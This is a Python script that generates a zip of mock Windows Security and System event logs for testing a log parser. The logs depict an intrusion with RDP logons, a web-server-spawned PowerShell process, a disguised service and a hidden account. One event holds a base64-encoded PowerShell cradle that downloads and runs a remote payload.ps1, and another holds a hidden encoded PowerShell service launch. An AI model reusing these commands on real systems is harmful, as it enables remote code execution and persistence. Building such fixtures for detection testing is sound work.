"""生成用于测试阶段一 EVTX/XML 日志解析的模拟攻击采集包 sample_attack_logs.zip"""
import pathlib
import zipfile

XML_CONTENT = """<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4625</EventID>
      <TimeCreated SystemTime="2026-10-20T01:10:00.000000Z" />
      <Computer>WIN-DC01.corp.local</Computer>
      <Channel>Security</Channel>
    </System>
    <EventData>
      <Data Name="TargetUserName">Administrator</Data>
      <Data Name="TargetDomainName">CORP</Data>
      <Data Name="LogonType">10</Data>
      <Data Name="IpAddress">185.220.101.45</Data>
      <Data Name="IpPort">54321</Data>
      <Data Name="Status">0xc000006d</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4624</EventID>
      <TimeCreated SystemTime="2026-10-20T01:12:30.000000Z" />
      <Computer>WIN-DC01.corp.local</Computer>
      <Channel>Security</Channel>
    </System>
    <EventData>
      <Data Name="TargetUserName">Administrator</Data>
      <Data Name="TargetDomainName">CORP</Data>
      <Data Name="LogonType">10</Data>
      <Data Name="IpAddress">185.220.101.45</Data>
      <Data Name="IpPort">54399</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-20T01:15:00.000000Z" />
      <Computer>WIN-DC01.corp.local</Computer>
      <Channel>Security</Channel>
    </System>
    <EventData>
      <Data Name="SubjectUserName">Administrator</Data>
      <Data Name="NewProcessId">0x1a2c</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="ProcessId">0x0f10</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\inetsrv\\w3wp.exe</Data>
      <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7045</EventID>
      <TimeCreated SystemTime="2026-10-20T01:16:10.000000Z" />
      <Computer>WIN-DC01.corp.local</Computer>
      <Channel>System</Channel>
    </System>
    <EventData>
      <Data Name="ServiceName">WinDefendUpdater</Data>
      <Data Name="ImagePath">%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -encodedcommand ZABvAHcAbgBsAG8AYQBkAA==</Data>
      <Data Name="ServiceType">user mode service</Data>
      <Data Name="StartType">demand start</Data>
      <Data Name="AccountName">LocalSystem</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4720</EventID>
      <TimeCreated SystemTime="2026-10-20T01:18:00.000000Z" />
      <Computer>WIN-DC01.corp.local</Computer>
      <Channel>Security</Channel>
    </System>
    <EventData>
      <Data Name="TargetUserName">support$</Data>
      <Data Name="TargetDomainName">CORP</Data>
      <Data Name="TargetSid">S-1-5-21-3623811015-3361044348-30300820-1013</Data>
      <Data Name="SubjectUserName">Administrator</Data>
      <Data Name="SubjectDomainName">CORP</Data>
    </EventData>
  </Event>
</Events>
"""

if __name__ == "__main__":
    zip_path = pathlib.Path(__file__).resolve().parent / "sample_attack_logs.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("Security_and_System_Snapshot.xml", XML_CONTENT)
    print(f"Generated: {zip_path}")
